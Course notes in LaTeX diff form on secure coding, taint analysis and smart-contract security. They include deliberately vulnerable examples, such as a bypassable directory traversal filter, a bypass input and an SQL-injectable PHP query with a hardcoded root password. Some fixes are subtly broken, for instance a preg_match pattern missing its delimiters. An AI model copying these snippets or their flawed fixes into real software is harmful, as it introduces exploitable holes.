+Sensitive data (e.g., default passwords, private encryption keys) are hardcoded: attackers accessing the code (from any installation) can easily reverse engineer them (even from binaries).
+
+\subsubsection*{Fix}
+\begin{itemize}
+\item Under Windows (C\#): use DPAPI (Data Protection API);
+\item Under Mac OS (C++): use the Apple Keychain;
+\item Any OS (Apache/C\#/ASP.NET): store sensitive data outside the web space.
+\item Windows (VB.NET): rather than storing in file, store sensitive data in the Windows registry.
+\item Java KeyStore: Use keytool application to store the keys in KeyStore. Keys are protected, but the keystore itself is not.
+\end{itemize}
+To sum it up: set permissions properly, do not embed sensitive data in the code (store it securely, outside the web space), scrub the memory once secret data is no longer needed (e.g., using the SecureString class in .NET or GuardedString in Java).
+
+\subsection{Information leakage}
+The attacker gains access to information about the target system, which makes his job easier, from:
+\begin{itemize}
+\item \textbf{Time}: time measures can leak information
+\item \textbf{Error messages}: username correctness, version information
+(attackers then know the vulnerabilities to try), network addresses, reasons for failure (e.g., SSL/TLS attacks), path information, exceptions
+\item \textbf{Stack information}: reported to the user when (in C/C++) a function is called with less parameters than expected
+\end{itemize}
+
+\subsubsection*{Fix}
+\begin{itemize}
+\item Use cryptographic implementations hardened against timing attacks;
+\item Ensure sensitive data are processed in a time independent way;
+\item Check that information is not leaked through error messages;
+\item Check parameter passing involving functions with a variable parameter list (e.g., format functions like printf);
+\item Perform output validation (symmetric to input validation), to ensure that no information leakage occurs;
+\item Use data encryption to avoid communicating sensitive data in
+clear over the network;
+\item Display sensitive information only to users having the necessary privileges and/or connected locally
+\end{itemize}
+
+\subsection{File access}
+Attackers take advantage of:
+\begin{itemize}
+\item \textbf{Race conditions}: the OS could switch to another program between times t and t’, processes executing concurrently might delete the file being accessed, because a file name is used instead of a file handle (which is locked).
+\item \textbf{Provide device names}: 
+\begin{lstlisting}
+	void AccessFile(char *szFileNameFromUser) {
+		HANDLE hFile = CreateFile(szFileNameFromUser, 0, 0, NULL,
+			OPEN_EXISTING, 0, NULL);
+	}
+\end{lstlisting}
+If a user passes an existing file, it works fine; if a user/attacker provides a device name, then the process remains stuck until the device times out. 
+\item \textbf{Directory traversal}:
+\begin{lstlisting}
+	def safe_open_file(fname, base="/var/myapp/"):
+		# Remove '..' and '.'
+		fname = fname.replace('../', '')
+		fname = fname.replace('./', '')
+		return open(os.path.join(base, fname))
+\end{lstlisting}
+If a user passes \lstinline|"../doc.txt"| or \lstinline|"./doc.txt"|, fname will be \lstinline|doc.txt| in the base directory and everything works fine. If an attacker provides: \lstinline|".../....///doc.txt"| the sanitized string fname becomes \lstinline|"../doc.txt"|. An attacker is then able to traverse to different directory and ready any file.
+\end{itemize}
+Attackers delete or replace files, provide device names, or traverse directories.
+
+\subsubsection*{Fix}
+\begin{itemize}
+\item Never use a file name for more than one operation. Use a file handle instead;
+\item Keep application files in safe directories, not accessible publicly. To increase security, create a new user to run the application;
+\item Resolve the path (symlink or "../") before validating it;
+\item To increase security, lock files explicitly when first accessed;
+\item If a file is known to be zero size, truncate it to avoid prepopulation;
+\item Check if a file is a real file, not a device, a symlink or a pipe.
+\end{itemize}
+
+\newpage
+\subsection{Network name resolution}
+The application relies on a DNS for network name resolution, but the communication with the DNS can be spoofed.
+\subsubsection*{Fix}
+\begin{itemize}
+\item Use cryptography (certificates, signed data in both directions), e.g., SSL;
+\item When applicable, use DNS over HTTPS (DoH).
+\end{itemize}
+
+
+\subsection{Race conditions}
+The application crashed by concurrent code that is allowed to access data not protected through mutual exclusion.
+
+\subsubsection*{More examples}
+\begin{lstlisting}
+	char* tmp;
+	FILE* pTempFile;
+	tmp = _tempnam("/tmp", "MyApp");
+	pTempFile = fopen(tmp, "r+");
+\end{lstlisting}
+This creates and opens a "random" temporary file with the prefix MyApp in /tmp. If an attacker has a write permission to directory /tmp, on some systems, the attacker could guess the next tmp file name and could prepopulate it with malicious content. \medskip
+
+\subsubsection*{Fix}
+\begin{itemize}
+\item Time of check and time of use (TOCTOU) should be within a
+protected time interval;
+\item Use locks/mutual exclusion to protect data that may be accessed
+concurrently (however, introducing too much synchronized code or too
+many locks may result in deadlocks and, hence, denial of service); 
+\item Write reentrant code;
+\item Use private (per-user) stores for temporary files and directories.
+\end{itemize}
+
+
+\subsection{Unauthenticated keys}
+Cryptographic keys are exchanged without any authentication of the involved parties. A man-in-the-middle intercepts the keys exchanged to start an encrypted communication.
+
+\subsubsection*{Fix}
+Key exchange alone is not secure. Every party should be strongly authenticated before key exchange occurs. 
+Use off-the-shelf, well tested solutions for authentication and key. exchange.
+
+
+\subsection{Random numbers}
+Unpredictable random numbers should be used to prevent an attacker from taking the role of an existing user.
+\begin{itemize}
+\item PRNG (Pseudo-random number generators): used for statistical simulation; given the seed, the sequence is totally predictable.
+\item CRNG (Cryptographic pseudo-random generators): the seed is un-guessable (as keys used in stream ciphers); reseeding is often performed; stronger seeds are obtained by mixing them with truly random data (entropy).
+\item TRNG (True random number generators): resort to dedicated hardware (exploiting some high entropy process) or to timestamps of unpredictable events, such as mouse movements (system random generator); often used just as seeds, since they may still contain some statistical bias.
+\end{itemize}
+
+\subsubsection*{Fix}
+\begin{itemize}
+\item Use cryptographic random generators or system random generators.
+\item To reach particularly high unpredictability standards (e.g., for lottery software), consider using a hardware random number generator (e.g., a USB entropy key).
+\end{itemize}
+
+
+\subsection{Usability}
+Security information is communicated, collected or made modifiable through an interface having quite poor usability. Users select the easy (usually unsecure) answer, without paying attention.
+Usability engineering and usability testing should be applied to security issues, as done for other functionalities.
+
+\subsubsection*{Guidelines}
+\begin{itemize}
+\item Systems should be designed to be secure by default: users rarely change their security setting.
+\item Make security decisions for users whenever possible.
+\item Treat certificate problems as the server being inaccessible.
+\item Discourage security lessening (e.g., by deeply nesting the associated configuration options).
+\item Adopt progressive disclosure to communicate security information.
+\item Make security communication actionable.
+\item Clearly indicate consequences.
+\item State password requirements explicitly, close to the password field.
+\end{itemize}
+
+\subsubsection*{Improve usability}
+\begin{itemize}
+\item The system makes security decisions for the user and it informs the user about such decisions. The system decision is actionable.
+\item Use tabs to disclose information progressively. Windows makes a similar dialog box (used by IE) available to any application, as an OS dialog.
+\end{itemize}
+
+\subsubsection*{Fix}
+\begin{itemize}
+\item Design secure systems by default and ask the user only when really needed;
+\item Inform the user simply and clearly, with actionable communications;
+\item Hide dangerous security options in deeply nested menus.
+\end{itemize}
+
+
+\newpage
+\subsection{Cross-Site Request Forgery}
+It is a type of attack that occurs when a malicious web site, email, blog, instant message, or program causes a user's web browser to perform an unwanted action on a trusted site when the user is authenticated.
+
+\subsubsection*{Example}
+A user connects with a bank and, thanks to the cookie, his operations are recognized:
+\begin{figure}[h]
+\centering
+\includegraphics[scale=0.2]{img/tranfer1.png}
+\end{figure}\\
+If someone else tries to make operations using the same GET request it will fail:
+\begin{figure}[h]
+\centering
+\includegraphics[scale=0.2]{img/tranfer2.png}
+\end{figure}\\
+CSRF works when the request is hidden in the HTML code that the user receives, so that it is actually him that makes the request:
+\begin{figure}[h]
+\centering
+\includegraphics[scale=0.2]{img/tranfer3.png}
+\end{figure} \\
+To fix it:
+\begin{itemize}
+\item Make sensitive action requests unique by attaching unpredictable request identifiers (nonce, one time token)
+\item Use reCAPTCHAs to complete actions
+\item Prompt authentication to complete sensitive action
+\end{itemize}
+
+\newpage
+\section{Flow Analysis}
+\textbf{Flow analysis} is a general static analysis framework that can be instantiated in several specific code analyses, among which taint analysis. In turn, flow analysis instantiates an even more general static analysis framework, \textbf{abstract interpretation}. 
+
+\subsection{Control flow graph}
+$$CFG = (N, E, n_e, n_x)$$
+\begin{itemize}
+\item Node set $N$: statements of the program P.
+\item Edge set $E \subseteq N \times N:(n, m) \in E$ if statement $m$ is one of the statements that can be executed immediately after $n$ according to the execution semantics of P (i.e., $m$ is an execution successor of $n$).
+\item Node $n_e \in N$: entry node of P.
+\item Node $n_x \in N$: exit node of P.
+\end{itemize}
+\begin{minipage}{0.6\textwidth}
+\begin{lstlisting}
+	<?php
+	1 $xx = explode(";", $_POST["x"]);
+	2 $s = $_POST["y"];
+	3 foreach ($xx as $x) {
+	4	$s = " " . $s;
+	5	if (htmlentities($x) == $x)
+	6		$s .= $x;
+ 	 }
+	7 echo $s;
+	?>
+\end{lstlisting}
+\end{minipage}
+\begin{minipage}{0.35\textwidth}
+\includegraphics[scale=0.4]{img/graph.png}
+\end{minipage}
+
+\subsection{Flow Analysis Framework}
+Flow Analysis Framework is a general procedure that can be used to determine properties that hold for a program by propagating proper flow information inside the control flow graph of the program. Flow information is altered during propagation according to the computation performed by each program statement. 
+\begin{enumerate}
+\item \textbf{Flow information} set V: Flow information that is propagated in the CFG, assigned to $IN[n]$ and $OUT[n]$ of CFG node n.
+\item \textbf{Transfer functions} $f_n(x): V \rightarrow V$: Computation performed by node n on the flow information. $$OUT[n]=f_n(IN[n])$$
+\item \textbf{Confluence (meet) operator} $\wedge$: To join flow values coming from the OUT of the predecessors (or successors) of current node n:
+$$IN[n]=\wedge_{p \in pred(n)} OUT[p]$$
+\item \textbf{Direction of propagation}: Forward (meet takes output from predecessors) or backward (meet uses successors)
+\end{enumerate}
+\begin{figure}[h]
+\centering
+\includegraphics[scale=0.3]{img/graph2.png}
+\end{figure}
+
+\subsubsection{Assumptions}
+\begin{itemize}
+\item Identity is a valid transfer function: $OUT[n] = f(IN[n]) = IN[n]$.
+\begin{figure}[h]
+\centering
+\includegraphics[scale=0.3]{img/graph3.png}
+\end{figure}
+
+\item Transfer functions can be obtained by composition:
+\begin{align*}
+OUT[n1] &= f(IN[n1]) \\
+OUT[n2] &= g(IN[n2]) \\
+\text{if }n &= seq(n1, n2), OUT[n] = g(f(IN[n]))\text{, where } IN[n] = IN[n1]
+\end{align*}
+\vspace*{-5mm}
+\begin{figure}[h]
+\centering
+\includegraphics[scale=0.3]{img/graph4.png}
+\end{figure}
+\item $\wedge$ is associative, commutative and idempotent:
+\begin{align*}
+x \wedge (y \wedge z) &= (x \wedge y) \wedge z \\
+x \wedge y &= y \wedge x \\
+x \wedge x &= x1
+\end{align*}
+\vspace*{-5mm}
+\begin{figure}[h]
+\centering
+\includegraphics[scale=0.3]{img/graph5.png}
+\end{figure}
+\item There exists a top element $T \in V$:
+$$T \wedge x = x$$
+\vspace*{-5mm}
+\begin{figure}[h]
+\centering
+\includegraphics[scale=0.3]{img/graph6.png}
+\end{figure}
+\item Transfer functions are monotonic:
+$$x \leq y \Rightarrow f_n(x) \leq f_n(y)$$
+where $x \leq y$ means $x \wedge y = x$, with $x \leq T \forall x \in V$ by definition.
+\begin{figure}[h]
+\centering
+\includegraphics[scale=0.3]{img/graph7.png}
+\end{figure}
+\end{itemize}
+
+\subsubsection{Flow analysis algorithm}
+\begin{lstlisting}[escapeinside={*}{*}]
+	1. for each node n
+	2. 	   *$IN[n]=T$*
+	3.     *$OUT[n]=f_n (IN[n])$*
+	4. end for
+	5. while any IN[n] or OUT[n] changes across iterations
+	6.     for each node n
+	7.		   *$IN[n]= \wedge{p \in pred(n)} OUT[p]$*
+	8.         *$OUT[n]= f_n (IN[n])$*
+	9.	   end for
+	10. end while
+\end{lstlisting}
+
+\subsubsection{Convergence}
+If a bottom element $\bot$ exists such that $\bot \leq x \forall x$, convergence
+descends from monotonicity; otherwise it must be proved case
+by case. When V is finite, $\bot$ is ensured to exist.
+\begin{figure}[h]
+\centering
+\includegraphics[scale=0.3]{img/graph8.png}
+\end{figure}
+
+\subsubsection{Meet over path solution}
+Meet over path (MOP) solution:
+$$MOP[n] = \wedge_{p \in P_n} f_p(T)$$
+\begin{figure}[h]
+\centering
+\includegraphics[scale=0.3]{img/graph9.png}
+\end{figure}
+EXACT solution (meet over feasible paths):
+$$EX[n]=\wedge_{p \in feas(P)} f_p(T)$$
+
+\subsubsection{Conservativity}
+Any solution lower than or equal to the exact solution is conservative. Based on $x \wedge y \leq x$, we can get
+$$FA[n] \leq MOP[n] \leq EX[n]$$
+A conservative (aka safe, sound) solution provides properties that hold for any feasible execution of the program; it may include properties obtained from infeasible execution paths (over- conservative properties), but the properties it includes are ensured to hold (i.e., they cannot be violated by any execution). When transfer functions are distributive, flow analysis produces the MOP solution:
+$$MOP[n] = FA[n] \;\text{ if }\; f_n(x \wedge y) = f_n(x) \wedge f_n(y)$$
+
+\section{Call string}
+\subsection{Interprocedural flow analysis}
+An interprocedural path p is realizable (valid) if, once only call and return nodes are kept:
+\begin{enumerate}
+\item p is empty; or,
+\item The first return node is immediately preceded by a matching call node and the path obtained after removing these two nodes is in turn realizable
+\end{enumerate}
+\begin{figure}[h]
+\centering
+\includegraphics[scale=0.3]{img/graph10.png}
+\end{figure}
+
+\subsection{Call string method}
+\begin{itemize}
+\item Flow information x is propagated together with the associated call string: (x, CS). The call string is k-bounded in the presence of recursion.
+\begin{figure}[h]
+\centering
+\includegraphics[scale=0.3]{img/graph11.png}
+\end{figure}
+\item The meet operator is applied only when call strings are identical:
+$$(x, CS_1) \wedge (y, CS_2) = (x \wedge y, CS_1) \;\text{ if }\; CS_1 = CS_2$$
+\begin{figure}[h]
+\centering
+\includegraphics[scale=0.3]{img/graph12.png}
+\end{figure}
+\item At return nodes, flow information is propagated only to call nodes matching the last element of the call string, which is removed.\\
+\begin{figure}[h]
+\centering
+\includegraphics[scale=0.3]{img/graph13.png}
+\end{figure}
+\end{itemize}
++ examples in videos 'Lecture\_5\_Flow\_analysis' (at the end) and 'Lecture\_6\_Call\_String'.
+
+\newpage
+\section{Taint Analysis}
+Variables containing unsanitized user input should never be used in security-critical statements, such as output statements, database queries, jumps to variable targets, virtual function invocations. \medskip \\
+\textbf{Taint analysis} aims at keeping track of tainted variables (i.e., variables containing unsanitized user input) along the execution paths: 
+\begin{itemize}
+\item \textbf{Static taint analysis}: a flow analysis conducted on the CFG, providing conservative results.
+\item \textbf{Dynamic taint analysis}: the taint status of variables is updated at run time and execution can be interrupted if a tainted variable is used at a security-critical statement
+\end{itemize}  
+\subsubsection*{Taint status}
+The \textbf{taint status} of a variable is \textbf{true} if the variable may contain unsanitized user input; \textbf{false} if it is ensured not to contain it:
+\begin{itemize}
+\item $x \rightarrow T$: variable x is tainted;
+\item $x \rightarrow F$: variable x is untainted;
+\end{itemize}
+
+\subsubsection*{Flow information}
+The flow information propagated for taint analysis consists of taint sets, i.e., sets of variables whose taint status is true. Formally: 
+\begin{equation*}
+V = \wp(X) \quad \text{where X is the set of all program variables}
+\end{equation*}
+
+\subsubsection*{Example}
+\begin{minipage}{0.5\textwidth}
+\begin{small}
+\begin{lstlisting}
+<?php 
+1  $xx = explode(";", $_POST["x"]); 
+2  $s = $_POST["y"]; 
+3  foreach ($xx as $x) { 
+4    $s = " " . $s; 
+5    if (htmlentities($x) == $x) 
+6       $s .= $x;    } 
+7  echo $s; 
+?>
+\end{lstlisting}
+\end{small}
+\end{minipage}
+\hfill\vline\hfill
+\begin{minipage}{0.4\textwidth}
+\begin{small}
+\begin{lstlisting}
+X = {xx, s, x} 
+x0 = {} 
+x1 = {xx}, x2 = {s}, x3 = {x} 
+x4 = {xx, s}, x5 = {xx, x} 
+x6 = {s, x}, x7 = X 
+
+V = P(X) = {x0, x1, x2, 
+	x3, x4,	x5, x6, x7}
+\end{lstlisting}
+\end{small}
+\end{minipage}
+\subsubsection*{Meet operator}
+At a join point, a variable is tainted if its status is tainted in any of the incoming edges: 
+$$x \rightarrow v = x \rightarrow v_1 \quad v_x \rightarrow v_2$$
+As a consequence, the meet operator is union: the taint set at node n is the union of the taint sets of its predecessors. \medskip \\
+Since the meet operator is union,
+\begin{itemize}
+\item \textbf{Top} is the empty set $(T \wedge x = x \quad \forall x)$
+\item \textbf{Monotonically decreasing} flow values correspond to increasingly larger taint sets $(x \leq y$ means $x \wedge y = x,$ i.e., $x \cup y = x$ or $y \subseteq x$
+\item \textbf{Bottom} is $X$, the set of all variables $(x \wedge \bot = \bot \forall x)$
+\item Since bottom exists, \textbf{convergence} is ensured if transfer functions are monotonic.
+\end{itemize}
+
+\subsubsection*{Example}
+\begin{minipage}{0.5\textwidth}
+\begin{small}
+\begin{lstlisting}
+<?php 
+1  $xx = explode(";", $_POST["x"]); 
+2  $s = $_POST["y"]; 
+3  foreach ($xx as $x) { 
+4    $s = " " . $s; 
+5    if (htmlentities($x) == $x) 
+6       $s .= $x;    } 
+7  echo $s; 
+?>
+\end{lstlisting}
+\end{small}
+\end{minipage}
+\hfill\vline\hfill
+\begin{minipage}{0.4\textwidth}
+\begin{center}
+\includegraphics[scale=0.3]{img/graph14.png}
+\end{center}
+\begin{small}
+$$IN[3] = \{xx, s\} \cup \{x\} \cup \{s\} = \{x, s, xx\}$$
+\end{small}
+\end{minipage}
+
+\subsection{Transfer function}
+The transfer function for taint analysis has the form: 
+$$f_n(x) = GEN[n] \cup (x \; \backslash \; KILL[n])$$
+with:
+\begin{itemize}
+\item $GEN[n] = \{x | x \text{ is assigned an input value at statement n} \} \cup \\\{x | \exists y: x \text{ is assigned a value obtained from } y \wedge y \rightarrow T\}$
+\item $KILL[n] = \{x | x \text{ is sanitized by statement n} \} \cup \\\{x | \forall y: x \text{ is assigned a value obtained from } y \wedge y \rightarrow F\}$
+\end{itemize} 
+Since transfer functions are monotonic, convergence is ensured.
+
+\subsection{Sanity checks}
+Sanity checks ensure that values are safe if the PASS branch of the sanity check is taken. This is modeled in the CFG as an extra, fictitious sanitization statement added as the first statement along the sanity check passed branch. \\
+\begin{minipage}{0.5\textwidth}
+\begin{small}
+\begin{lstlisting}
+<?php 
+1  $xx = explode(";", $_POST["x"]); 
+2  $s = $_POST["y"]; 
+3  foreach ($xx as $x) { 
+4    $s = " " . $s; 
+5    if (htmlentities($x) == $x) 
+6       $s .= $x;    } 
+7  echo $s; 
+?>
+\end{lstlisting}
+\end{small}
+\end{minipage}
+\hfill\vline\hfill
+\begin{minipage}{0.4\textwidth}
+\begin{center}
+\includegraphics[scale=0.25]{img/graph15.png}
+\end{center}
+\begin{lstlisting}
+5T $x = sanitize($x);
+\end{lstlisting}
+\end{minipage}
+
+\subsection{Example}
+Using the previous PHP code example: \medskip\\
+\begin{tabular}{|l|c|c|}\hline
+ & GEN & KILL \\ \hline
+1 & $\{xx\}$ & $\{\}$\\
+2 & $\{s\}$ & $\{\}$\\
+3 & $\{[xx \rightarrow T]x\}$ & $\{[xx \rightarrow F]x\}$\\
+4 & $\{[s \rightarrow T]s\}$ & $\{[s \rightarrow F]s\}$\\
+5 & $\{\}$ & $\{\}$\\
+5T & $\{\}$ & $\{x\}$\\
+6 & $\{[s \rightarrow T | x \rightarrow T]s\}$ & $\{[s \rightarrow F \; \& \; x \rightarrow F]s\}$\\
+7 & $\{\}$ & $\{\}$\\ \hline
+\end{tabular} \medskip\\
+Taint analysis algorithm:
+\begin{lstlisting}[escapeinside={(*}{*)}]
+	1.	for each node n
+	2.		IN[n]={}
+	3.		OUT[n]=GEN[n]
+	4.	end for
+	5.	while any IN[n] or OUT[n] changes across iterations
+	6.		for each node n
+	7.			IN[n]= (*$\cup_{p \in pred(n)}$*) OUT[p]
+	8.			OUT[n]= GEN[n] (*$ \cup $*) (IN[n] \ KILL[n])
+	9.		end for
+	10.	end while
+\end{lstlisting}
+Using the IN and OUT functions: \medskip\\
+\begin{tabular}{|l|c|c|c|c|}\hline
+ & GEN & KILL & IN & OUT \\ \hline
+1 & $\{xx\}$ & $\{\}$ & $\{\}$ & $\{xx\}$\\
+2 & $\{s\}$ & $\{\}$ & $\{xx\}$ & $\{xx, s\}$\\
+3 & $\{[xx \rightarrow T]x\}$ & $\{[xx \rightarrow F]x\}$ & $\{xx, s\}$ & $\{xx, s, x\}$\\
+4 & $\{[s \rightarrow T]s\}$ & $\{[s \rightarrow F]s\}$ & $\{xx, s, x\}$ & $\{xx, s, x\}$\\
+5 & $\{\}$ & $\{\}$ & $\{xx, s, x\}$ & $\{xx, s, x\}$\\
+5T & $\{\}$ & $\{x\}$ & $\{xx, s, x\}$ & $\{xx, s\}$\\
+6 & $\{[s \rightarrow T | x \rightarrow T]s\}$ & $\{[s \rightarrow F \; \& \; x \rightarrow F]s\}$ & $\{xx, s\}$ & $\{xx, s\}$\\
+7 & $\{\}$ & $\{\}$ & $\{xx, s, x\}$ & $\{xx, s, x\}$\\ \hline
+\end{tabular} 
+\begin{center}
+\includegraphics[scale=0.3]{img/st3.png}
+\end{center}
+The tainted var \$\textbf{s} is echoed in line 7, which could result in a vulnerability. To fix it, change line 2 to:
+\begin{lstlisting}
+	2 $s = htmlentities($_POST["y"]);
+\end{lstlisting}
+The IN and OUT functions become: \medskip\\
+\begin{tabular}{|l|c|c|c|c|}\hline
+ & GEN & KILL & IN & OUT \\ \hline
+1 & $\{xx\}$ & $\{\}$ & $\{\}$ & $\{xx\}$\\
+2 & $\{s\}$ & $\{s\}$ & $\{xx\}$ & $\{xx\}$\\
+3 & $\{[xx \rightarrow T]x\}$ & $\{[xx \rightarrow F]x\}$ & $\{xx,x\}$ & $\{xx, x\}$\\
+4 & $\{[s \rightarrow T]s\}$ & $\{[s \rightarrow F]s\}$ & $\{xx, x\}$ & $\{xx, x\}$\\
+5 & $\{\}$ & $\{\}$ & $\{xx, x\}$ & $\{xx, x\}$\\
+5T & $\{\}$ & $\{x\}$ & $\{xx, x\}$ & $\{xx\}$\\
+6 & $\{[s \rightarrow T | x \rightarrow T]s\}$ & $\{[s \rightarrow F \; \& \; x \rightarrow F]s\}$ & $\{xx\}$ & $\{xx\}$\\
+7 & $\{\}$ & $\{\}$ & $\{xx, x\}$ & $\{xx, x\}$\\ \hline
+\end{tabular} \medskip\\
+\$\textbf{s} is now untainted, and can be echoed safely.
+
+\newpage
+\subsection{Another example}
+\begin{lstlisting}
+<?php
+1 	$db = mysql_connect("localhost", "root", "asd");
+2 	mysql_select_db("Shipping", $db);
+3 	$id = $HTTP_GET_VARS["id"];
+4 	$query = "SELECT ccnum FROM cust WHERE id =%$id%";
+5 	$result = mysql_query($query, $db);
+6 	for ($i = 0; $i < mysql_num_rows(); $i++)
+7		echo mysql_result($result, $i, "ccnum");
+?>
+\end{lstlisting}
+\begin{center}
+\includegraphics[scale=0.3]{img/st4.png}
+\end{center}
+The tainted var \$query is used in a db query in line 5. Also the tainted var \$result is echoed in line 7. To fix it, add a preg\_match function to check \$id before using it:
+\begin{lstlisting}
+<?php
+1 	$db = mysql_connect("localhost", "root", "asd");
+2 	mysql_select_db("Shipping", $db);
+3 	$id = $HTTP_GET_VARS["id"];
+4 	if (preg_match('^\d{1,8}$', $id)) {
+5		$query = "SELECT ccnum FROM cust WHERE id =%$id%";
+6 		$result = mysql_query($query, $db);
+7 		for ($i = 0; $i < mysql_num_rows(); $i++)
+8			echo mysql_result($result, $i, "ccnum");
+9	}
+?>
+\end{lstlisting}
+Variables \$query and \$result are now untainted and can be used safely.
+\begin{center}
+\includegraphics[scale=0.3]{img/st5.png}
+\end{center}
+
+\newpage
+\section{Dynamic Taint Analysis}
+Code instrumentation is used to store and update the taint status of variables and to interrupt execution if a tainted variable containing malicious payload is used at a security-critical statement (a so-called taint sink).
+Instrumentation can be done on:
+\begin{itemize}
+\item Source code
+\item Byte code
+\item Binary code
+\end{itemize}
+Instrumentation is based on a dynamic taint policy, specifying:
+\begin{itemize}
+\item Taint introduction: when variables become tainted (e.g., input).
+\item Taint propagation: how tainted variables used to compute the value assigned to another variable determine its taint status.
+\item Taint checking: to detect attacks based on the values of tainted variables and to halt the execution when these occur.
+\end{itemize}
+The previous example
+\begin{lstlisting}
+<?php 
+1  $xx = explode(";", $_POST["x"]); 
+2  $s = $_POST["y"]; 
+3  foreach ($xx as $x) { 
+4    $s = " " . $s; 
+5    if (htmlentities($x) == $x) 
+6       $s .= $x;    } 
+7  echo $s; 
+?>
+\end{lstlisting}
+becomes:
+\begin{small}
+\begin{lstlisting}
+<?php
+  $xx = explode(";", $_POST["x"]);
+  makeTainted("xx"); // $Tainted["xx"] = true;
+  $s = $_POST["y"];
+  makeTainted("s");
+  foreach ($xx as $x) {
+    makeCondTainted("x", array("xx"));
+    $s = " " . $s;
+    makeCondTainted("s", array("s"));
+    if (htmlentities($x) == $x) {
+      makeUntainted("x");
+      $s .= $x;
+      makeCondTainted("s", array("s", "x"));
+    }
+  }
+  if (isTainted("s") && isXssAttack($s))
+    exit("Security violation");
+  echo $s;
+?>
+\end{lstlisting}
+\end{small}
+\subsection{Taint sinks}
+\begin{tabular}{|l|p{10cm}|} \hline
+Attack & Taint sink \\ \hline
+Buffer overflow & String functions with no size check (strcpy, sprintf, etc.); array allocation (e.g., new Str[input]). \\\hline
+String format & Functions using format strings (e.g., printf, sprintf, etc.).\\\hline
+Integer overflow & Integer computations, especially with small size types (short, char).\\\hline
+SQL injection & SQL queries (e.g., mysql\_query).\\\hline
+Command injection & Command execution statements (e.g., system, exec).\\\hline
+Error handling & Statements that may cause errors or throw exceptions, if such errors/exceptions are not handled properly in the code.\\\hline
+XSS & Output statements (echo, print, etc.).\\\hline
+File access & File opening and directory traversal statements (e.g., open). \\\hline
+\end{tabular}
+\subsection{Binary taint sinks}
+\begin{tabular}{|l|p{10cm}|} \hline
+Attack & Taint sink \\ \hline
+Buffer overflow & Return address, jump address, function pointer, function pointer offset. \\\hline
+String format & Return address, jump address, function pointer, function pointer offset, system call arguments, function call arguments. \\\hline
+Integer overflow & Integer computations. \\\hline
+SQL injection & Function call arguments. \\\hline
+Command injection & System call arguments, function call arguments. \\\hline
+Error handling & Statements that may cause errors or throw exceptions, if such errors/exceptions are not handled properly in the code. \\\hline
+XSS & Output statements. \\\hline
+File access & File opening and directory traversal system and function calls (e.g., open). \\\hline
+\end{tabular}
+
+\subsection{Binary vs. source code}
+Binary taint analysis is often restricted to the taint status of return address, jump address, function pointers and function pointer offsets, which makes it more efficient but less powerful:
+\begin{itemize}
+\item The gap between time of detection and time of attacks might be
+high.
+\item Some attacks go undetected (e.g., integer overflow).
+\item User defined sanitizations are not considered.
+\end{itemize}
+
+\subsection{Under-tainting / over-tainting}
+A taint policy may be too permissive or too strict:
+\begin{itemize}
+\item \textbf{False negatives}: The taint policy underestimates the taint sets, hence potentially missing some attacks (i.e., leaving some attacks unnoticed).
+\item \textbf{False positives}: The taint policy overestimates the taint sets, hence potentially reporting false alarms (i.e., halting the program during legal executions).
+\end{itemize}
+
+\subsubsection*{Example}
+In binary taint analysis, the taint policy might be:
+\begin{itemize}
+\item Memory offsets derived from user input are untainted: Attackers can use memory data to redirect the control flow, by controlling the offset, without being noticed (false negative).
+\item Memory offsets derived from user input are tainted: Legal access to data according to a user defined input are regarded as attacks (false positive).
+\end{itemize}
+\begin{lstlisting}
+	// false negative
+	x = input();
+	y = load(z + x);
+	goto y;
+	// false positive
+	x = input();
+	y = load(z + x);
+	process(y);
+\end{lstlisting}
+
+\subsection{Static vs. dynamic taint analysis}
+Static taint analysis:
+\begin{itemize}
+\item \textbf{Conservative}: No false negatives
+\item \textbf{Potentially over-conservative}: False positives
+\item \textbf{No taint check}: False alarms
+\item \textbf{Performance}: No overhead
+\end{itemize}
+Dynamic taint analysis:
+\begin{itemize}
+\item \textbf{Undertainting}: False negatives
+\item \textbf{Overtainting}: False positives
+\item \textbf{Taint check} (on source code): Precise alarms
+\item \textbf{Performance}: Major penalties
+\end{itemize}
+
+\subsection{Example}
+Watch the video.
+
+\newpage
+\section{Security of Smart Contracts}
+\begin{itemize}
+\item Blockchain: decentralised data structure used by cryptocurrencies (e.g., Bitcoin, Ethereum) to record transactions, such as payments (consensus protocol, no need for trusted party).
+\item Smart contract: full-fledged program that is run on a blockchain and implements a contract between users. It is used for saving wallets, investments, insurances, games, etc. In 2016 more than 15k smart contracts were deposited in the Ethereum platform.
+\end{itemize}
+\textbf{Problem}: programs have bugs, but bugs in smart contracts might generate illegal gains and losses; moreover, bugs in smart contracts cannot be patched (smart contracts are irreversible).
+
+\subsection{Consensus protocol}
+\begin{center}
+\includegraphics[scale=0.4]{img/consprot.png}
+\end{center}
+\begin{enumerate}
+\item In every epoch, each miner can propose a block of new transactions to update the blockchain
+\item A leader is elected probabilistically
+\item The leader broadcasts the proposed block to all miners
+\item All miners update the blockchain and include the new block
+\end{enumerate}
+In \textbf{Bitcoin} the state of an account with a given address holds some coins (balance), in Ethereum accounts include coins, executable code and persistent (private) storage (balance, code, storage).
+
+\subsection{Smart contracts}
+A Smart contract is an autonomous agent stored in the blockchain by a “creation” transaction, with a state consisting of balance and private storage, and whose code is stored as Ethereum Virtual Machine bytecode. 
+\begin{center}
+\includegraphics[scale=0.37]{img/contract.png}
+\end{center}
+When a “contract creation” transaction is executed, all miners modify the blockchain state adding the new contract: 
+\begin{itemize}
+\item the contract is assigned a new address
+\item a private storage is created and initialized by running the constructor
+\item the EVM bytecode is associated with the contract
+\end{itemize} 
+The contract owner invokes a transaction to update the reward. Other users invoke a transaction to submit their solution to the puzzle.
+
+\subsubsection{Gas system}
+Each EVM instruction needs a pre-specified amount of \textbf{gas} to be executed: users sending a transaction specify \textbf{gasPrice} and \textbf{gasLimit}.
+Miners who execute the transaction receive gasPrice multiplied by the actually consumed gas, up to gasLimit. If the execution exceeds gasLimit, it is rolled back and cancelled, but the sender has still to pay gasLimit to the miner.
+
+\subsection{Security bugs}
+There are 4 types of bugs:
+\begin{itemize}
+\item Transaction-Ordering Dependence (TOD)
+\item Timestamp dependence
+\item Mishandled exceptions
+\item Reentrancy vulnerability
+\end{itemize}
+
+\subsubsection{Transaction-Ordering Dependence}
+If a block contains two transactions $T_i$, $T_j$ invoking the same contract, the order of execution is unknown until the miner who mines the block decides it. If the final state depends on the transaction order, it is unknown at the time of transaction submission. 
+\begin{center}
+\includegraphics[scale=0.4]{img/tod.png}
+\end{center}
